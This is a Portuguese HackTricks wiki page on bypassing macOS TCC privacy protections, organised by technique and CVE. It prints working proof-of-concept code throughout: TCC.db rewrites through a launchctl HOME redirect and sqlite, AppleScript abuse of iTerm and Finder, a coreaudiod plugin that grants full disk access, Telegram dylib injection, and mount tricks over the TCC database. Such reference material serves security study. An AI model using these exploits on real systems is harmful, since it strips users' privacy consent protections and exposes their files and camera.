# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Por funcionalidade

### Bypass de Escrita

Isso não é um bypass, é apenas como o TCC funciona: **Ele não protege contra escrita**. Se o Terminal **não tiver acesso para ler a Área de Trabalho de um usuário, ainda pode escrever nela**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
O **atributo estendido `com.apple.macl`** é adicionado ao novo **arquivo** para dar ao **aplicativo criador** acesso para lê-lo.

### TCC ClickJacking

É possível **colocar uma janela sobre o prompt do TCC** para fazer o usuário **aceitar** sem perceber. Você pode encontrar um PoC em [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Solicitação TCC por nome arbitrário

O atacante pode **criar aplicativos com qualquer nome** (por exemplo, Finder, Google Chrome...) no **`Info.plist`** e fazer com que ele solicite acesso a algum local protegido pelo TCC. O usuário pensará que o aplicativo legítimo é quem está solicitando esse acesso.\
Além disso, é possível **remover o aplicativo legítimo do Dock e colocar o falso nele**, para que quando o usuário clicar no falso (que pode usar o mesmo ícone), ele possa chamar o legítimo, pedir permissões do TCC e executar um malware, fazendo o usuário acreditar que o aplicativo legítimo solicitou o acesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Mais informações e PoC em:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### Bypass SSH

Por padrão, o acesso via **SSH costumava ter "Acesso Completo ao Disco"**. Para desativar isso, você precisa tê-lo listado, mas desativado (removê-lo da lista não removerá esses privilégios):

![](<../../../../../images/image (1077).png>)

Aqui você pode encontrar exemplos de como alguns **malwares conseguiram contornar essa proteção**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Note que agora, para poder habilitar o SSH, você precisa de **Acesso Completo ao Disco**

### Manipulação de extensões - CVE-2022-26767

O atributo **`com.apple.macl`** é dado a arquivos para dar a **um determinado aplicativo permissões para lê-lo.** Este atributo é definido ao **arrastar e soltar** um arquivo sobre um aplicativo, ou quando um usuário **clica duas vezes** em um arquivo para abri-lo com o **aplicativo padrão**.

Portanto, um usuário poderia **registrar um aplicativo malicioso** para manipular todas as extensões e chamar os Serviços de Lançamento para **abrir** qualquer arquivo (assim, o arquivo malicioso terá acesso para lê-lo).

### iCloud

A concessão **`com.apple.private.icloud-account-access`** torna possível comunicar-se com o serviço XPC **`com.apple.iCloudHelper`** que **fornecerá tokens do iCloud**.

**iMovie** e **Garageband** tinham essa concessão e outras que permitiam.

Para mais **informações** sobre a exploração para **obter tokens do iCloud** dessa concessão, confira a palestra: [**#OBTS v5.0: "O que acontece no seu Mac, fica no iCloud da Apple?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automação

Um aplicativo com a permissão **`kTCCServiceAppleEvents`** poderá **controlar outros aplicativos**. Isso significa que ele poderá **abusar das permissões concedidas aos outros aplicativos**.

Para mais informações sobre Apple Scripts, confira:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Por exemplo, se um aplicativo tem **permissão de Automação sobre `iTerm`**, por exemplo, neste exemplo **`Terminal`** tem acesso sobre iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Sobre iTerm

Terminal, que não tem FDA, pode chamar iTerm, que tem, e usá-lo para realizar ações:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Over Finder

Ou se um aplicativo tiver acesso ao Finder, pode ser um script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Comportamento do App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O **daemon tccd** do userland estava usando a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [este post do Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e porque o daemon TCC está sendo executado via `launchd` dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas para ele.\
Assim, um **atacante poderia definir a variável de ambiente `$HOME`** no **`launchctl`** para apontar para um **diretório controlado**, **reiniciar** o **daemon TCC**, e então **modificar diretamente o banco de dados TCC** para se conceder **todas as permissões TCC disponíveis** sem nunca solicitar ao usuário final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notas

Notas tinham acesso a locais protegidos pelo TCC, mas quando uma nota é criada, ela é **criada em um local não protegido**. Assim, você poderia pedir para notas copiarem um arquivo protegido em uma nota (ou seja, em um local não protegido) e então acessar o arquivo:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocação

O binário `/usr/libexec/lsd` com a biblioteca `libsecurity_translocate` tinha a permissão `com.apple.private.nullfs_allow`, que permitia criar um **nullfs** mount e tinha a permissão `com.apple.private.tcc.allow` com **`kTCCServiceSystemPolicyAllFiles`** para acessar todos os arquivos.

Era possível adicionar o atributo de quarentena a "Library", chamar o serviço XPC **`com.apple.security.translocation`** e então ele mapeava Library para **`$TMPDIR/AppTranslocation/d/d/Library`** onde todos os documentos dentro de Library poderiam ser **acessados**.

### CVE-2023-38571 - Música & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** tem um recurso interessante: Quando está em execução, ele **importa** os arquivos soltos para **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** na "biblioteca de mídia" do usuário. Além disso, chama algo como: **`rename(a, b);`** onde `a` e `b` são:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Esse comportamento **`rename(a, b);`** é vulnerável a uma **Condição de Corrida**, pois é possível colocar dentro da pasta `Automatically Add to Music.localized` um arquivo **TCC.db** falso e então, quando a nova pasta (b) é criada para copiar o arquivo, deletá-lo e apontá-lo para **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Se **`SQLITE_SQLLOG_DIR="path/folder"`** basicamente significa que **qualquer db aberto é copiado para esse caminho**. Neste CVE, esse controle foi abusado para **escrever** dentro de um **banco de dados SQLite** que será **aberto por um processo com FDA o banco de dados TCC**, e então abusar de **`SQLITE_SQLLOG_DIR`** com um **symlink no nome do arquivo** para que, quando aquele banco de dados for **aberto**, o usuário **TCC.db é sobrescrito** com o aberto.\
**Mais info** [**na descrição**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **e** [**na palestra**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Se a variável de ambiente **`SQLITE_AUTO_TRACE`** estiver definida, a biblioteca **`libsqlite3.dylib`** começará a **registrar** todas as consultas SQL. Muitos aplicativos usaram essa biblioteca, então era possível registrar todas as suas consultas SQLite.

Vários aplicativos da Apple usaram essa biblioteca para acessar informações protegidas pelo TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Esta **variável de ambiente é usada pelo framework `Metal`** que é uma dependência de vários programas, notavelmente `Music`, que possui FDA.

Definindo o seguinte: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Se `path` for um diretório válido, o bug será acionado e podemos usar `fs_usage` para ver o que está acontecendo no programa:

- um arquivo será `open()`ado, chamado `path/.dat.nosyncXXXX.XXXXXX` (X é aleatório)
- uma ou mais `write()`s escreverão o conteúdo no arquivo (não controlamos isso)
- `path/.dat.nosyncXXXX.XXXXXX` será `renamed()` para `path/name`

É uma gravação de arquivo temporário, seguida por um **`rename(old, new)`** **que não é seguro.**

Não é seguro porque precisa **resolver os caminhos antigos e novos separadamente**, o que pode levar algum tempo e pode ser vulnerável a uma Condição de Corrida. Para mais informações, você pode conferir a função `renameat_internal()` do `xnu`.

> [!CAUTION]
> Então, basicamente, se um processo privilegiado estiver renomeando de uma pasta que você controla, você poderia ganhar um RCE e fazer com que ele acesse um arquivo diferente ou, como neste CVE, abrir o arquivo que o aplicativo privilegiado criou e armazenar um FD.
>
> Se o rename acessar uma pasta que você controla, enquanto você tiver modificado o arquivo de origem ou tiver um FD para ele, você muda o arquivo (ou pasta) de destino para apontar para um symlink, assim você pode escrever sempre que quiser.

Este foi o ataque no CVE: Por exemplo, para sobrescrever o `TCC.db` do usuário, podemos:

- criar `/Users/hacker/ourlink` para apontar para `/Users/hacker/Library/Application Support/com.apple.TCC/`
- criar o diretório `/Users/hacker/tmp/`
- definir `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- acionar o bug executando `Music` com esta variável de ambiente
- capturar o `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X é aleatório)
- aqui também `open()` este arquivo para escrita e segurar o descritor de arquivo
- trocar atomicamente `/Users/hacker/tmp` com `/Users/hacker/ourlink` **em um loop**
- fazemos isso para maximizar nossas chances de sucesso, pois a janela de corrida é bastante estreita, mas perder a corrida tem desvantagens negligenciáveis
- esperar um pouco
- testar se tivemos sorte
- se não, executar novamente do início

Mais informações em [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Agora, se você tentar usar a variável de ambiente `MTL_DUMP_PIPELINES_TO_JSON_FILE`, os aplicativos não serão iniciados

### Apple Remote Desktop

Como root, você poderia habilitar este serviço e o **agente ARD terá acesso total ao disco**, que poderia ser abusado por um usuário para fazer com que ele copie um novo **banco de dados de usuário TCC**.

## Por **NFSHomeDirectory**

O TCC usa um banco de dados na pasta HOME do usuário para controlar o acesso a recursos específicos do usuário em **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Portanto, se o usuário conseguir reiniciar o TCC com uma variável de ambiente $HOME apontando para uma **pasta diferente**, o usuário poderia criar um novo banco de dados TCC em **/Library/Application Support/com.apple.TCC/TCC.db** e enganar o TCC para conceder qualquer permissão TCC a qualquer aplicativo.

> [!TIP]
> Note que a Apple usa a configuração armazenada dentro do perfil do usuário no atributo **`NFSHomeDirectory`** para o **valor de `$HOME`**, então se você comprometer um aplicativo com permissões para modificar este valor (**`kTCCServiceSystemPolicySysAdminFiles`**), você pode **armazenar** esta opção com um bypass do TCC.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

O **primeiro POC** usa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) para modificar a **pasta HOME** do usuário.

1. Obter um blob _csreq_ para o aplicativo alvo.
2. Plantar um arquivo _TCC.db_ falso com acesso necessário e o blob _csreq_.
3. Exportar a entrada de Serviços de Diretório do usuário com [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modificar a entrada de Serviços de Diretório para mudar o diretório home do usuário.
5. Importar a entrada de Serviços de Diretório modificada com [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Parar o _tccd_ do usuário e reiniciar o processo.

O segundo POC usou **`/usr/libexec/configd`** que tinha `com.apple.private.tcc.allow` com o valor `kTCCServiceSystemPolicySysAdminFiles`.\
Era possível executar **`configd`** com a opção **`-t`**, um atacante poderia especificar um **Bundle personalizado para carregar**. Portanto, a exploração **substitui** o método **`dsexport`** e **`dsimport`** de mudar o diretório home do usuário por uma **injeção de código configd**.

Para mais informações, confira o [**relatório original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Por injeção de processo

Existem diferentes técnicas para injetar código dentro de um processo e abusar de seus privilégios TCC:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Além disso, a injeção de processo mais comum para contornar o TCC encontrada é via **plugins (load library)**.\
Plugins são códigos extras geralmente na forma de bibliotecas ou plist, que serão **carregados pelo aplicativo principal** e serão executados sob seu contexto. Portanto, se o aplicativo principal tiver acesso a arquivos restritos pelo TCC (via permissões ou direitos concedidos), o **código personalizado também terá**.

### CVE-2020-27937 - Directory Utility

O aplicativo `/System/Library/CoreServices/Applications/Directory Utility.app` tinha a permissão **`kTCCServiceSystemPolicySysAdminFiles`**, carregava plugins com extensão **`.daplug`** e **não tinha o runtime** endurecido.

Para armazenar este CVE, o **`NFSHomeDirectory`** é **mudado** (abusando da permissão anterior) para poder **assumir o banco de dados TCC dos usuários** para contornar o TCC.

Para mais informações, confira o [**relatório original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

O binário **`/usr/sbin/coreaudiod`** tinha as permissões `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. A primeira **permitindo injeção de código** e a segunda dando acesso para **gerenciar o TCC**.

Este binário permitia carregar **plugins de terceiros** da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plugin e abusar das permissões TCC** com este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Para mais informações, consulte o [**relatório original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-Ins da Camada de Abstração de Dispositivos (DAL)

Aplicativos do sistema que abrem o fluxo da câmera via Core Media I/O (aplicativos com **`kTCCServiceCamera`**) carregam **no processo esses plugins** localizados em `/Library/CoreMediaIO/Plug-Ins/DAL` (não restrito pelo SIP).

Basta armazenar lá uma biblioteca com o **construtor** comum para **injetar código**.

Vários aplicativos da Apple eram vulneráveis a isso.

### Firefox

O aplicativo Firefox tinha as permissões `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Para mais informações sobre como explorar isso facilmente [**ver o relatório original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

O binário `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` tinha as permissões **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, que permitiam injetar código dentro do processo e usar os privilégios do TCC.

### CVE-2023-26818 - Telegram

O Telegram tinha as permissões **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, então era possível abusar disso para **obter acesso às suas permissões** como gravar com a câmera. Você pode [**encontrar o payload na descrição**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Note como usar a variável env para carregar uma biblioteca, um **plist personalizado** foi criado para injetar essa biblioteca e **`launchctl`** foi usado para lançá-la:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Por invocações abertas

É possível invocar **`open`** mesmo enquanto está em sandbox

### Scripts de Terminal

É bastante comum conceder **Acesso Completo ao Disco (FDA)**, pelo menos em computadores usados por pessoas da área de tecnologia. E é possível invocar scripts **`.terminal`** usando isso.

Scripts **`.terminal`** são arquivos plist como este com o comando a ser executado na chave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Um aplicativo poderia escrever um script de terminal em um local como /tmp e lançá-lo com um comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montando

### CVE-2020-9771 - bypass do TCC do mount_apfs e escalonamento de privilégios

**Qualquer usuário** (mesmo os sem privilégios) pode criar e montar um snapshot do time machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que o aplicativo usado (como `Terminal`) tenha acesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), que precisa ser concedido por um administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Uma explicação mais detalhada pode ser [**encontrada no relatório original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Montar sobre o arquivo TCC

Mesmo que o arquivo do banco de dados TCC esteja protegido, era possível **montar sobre o diretório** um novo arquivo TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Verifique o **exploit completo** na [**escrita original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Conforme explicado na [escrita original](https://www.kandji.io/blog/macos-audit-story-part2), este CVE abusou do `diskarbitrationd`.

A função `DADiskMountWithArgumentsCommon` do framework público `DiskArbitration` realizava as verificações de segurança. No entanto, é possível contorná-la chamando diretamente o `diskarbitrationd` e, portanto, usar elementos `../` no caminho e symlinks.

Isso permitiu que um atacante realizasse montagens arbitrárias em qualquer local, incluindo sobre o banco de dados TCC devido à concessão `com.apple.private.security.storage-exempt.heritable` do `diskarbitrationd`.

### asr

A ferramenta **`/usr/sbin/asr`** permitiu copiar todo o disco e montá-lo em outro lugar contornando as proteções do TCC.

### Serviços de Localização

Há um terceiro banco de dados TCC em **`/var/db/locationd/clients.plist`** para indicar os clientes autorizados a **acessar os serviços de localização**.\
A pasta **`/var/db/locationd/` não estava protegida contra montagem de DMG**, então era possível montar nosso próprio plist.

## Por aplicativos de inicialização

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Por grep

Em várias ocasiões, arquivos armazenarão informações sensíveis como e-mails, números de telefone, mensagens... em locais não protegidos (o que conta como uma vulnerabilidade na Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Cliques Sintéticos

Isso não funciona mais, mas [**funcionou no passado**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Outra maneira usando [**eventos CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Referência

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
